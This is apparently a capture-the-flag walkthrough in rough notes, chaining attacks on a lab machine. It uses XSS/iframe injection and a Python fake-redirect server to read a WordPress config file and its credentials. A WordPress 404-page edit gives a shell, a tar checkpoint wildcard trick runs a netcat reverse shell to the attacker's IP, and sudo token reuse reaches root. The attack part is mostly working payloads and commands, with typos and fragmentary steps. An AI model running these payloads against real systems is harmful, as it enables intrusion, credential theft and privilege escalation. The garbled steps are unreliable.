we got a page on a ==subdomain== and it had 4 parameters to fill

so i tried ==iframe== and it worked now i tried everythign but couldnot make /etc/password work

now , i did

`"><h1>XSS</h1>`   ->> it also worked

`"><iframe height="900" width="900" src="http://10.18.10.9/"></iframe>`

it gives us the connectin but dont show anything ..maybe it is not ==redirecting== .. so i copied a redirection payload

```
import SimpleHTTPServer
import SocketServer

class FakeRedirect(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def do_GET(self):
       #print self.path
       self.send_response(301)
       #new_path = '%s%s'%('http://localhost:8081', self.path)
       self.send_header('Location','file:///var/www/wordpress/wp-config.php' )
       self.end_headers()

SocketServer.TCPServer(("", 80), FakeRedirect).serve_forever()
```

just changed the file and run it now i can read data

it gave us some ==creds== on ==`/var/www/wordpress/wp-config.php`==

we logged in ==wordpress== adn edited 404 php error page and got shell

now in opt dir tar file execution was there

```
echo "mkfifo /tmp/lhennp; nc 10.18.10.9 5555 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

and it gives back shell.. or we can make  a shell.sh file and then execute it same thing

now for root part

> ## NOTE:-kyle used ==sudo== to login 15 mins ago so we can logging using that with passwd

we are reusing sudo token

for that we need to run

```
gdb
chmod 777 gdb.deb
dpkg -x gdb.deb /home/kyle/test/
chmdo 777 gdb_9.1-0ubuntu1_amd64.deb
clone this https://github.com/nongiach/sudo_inject
wget activate_sudo and exploit.sh 
run them both and sudo su   to root
```

dwld ==gdb== from `https://ubuntu.pkgs.org/20.04/ubuntu-main-amd64/gdb_9.1-0ubuntu1_amd64.deb.html`
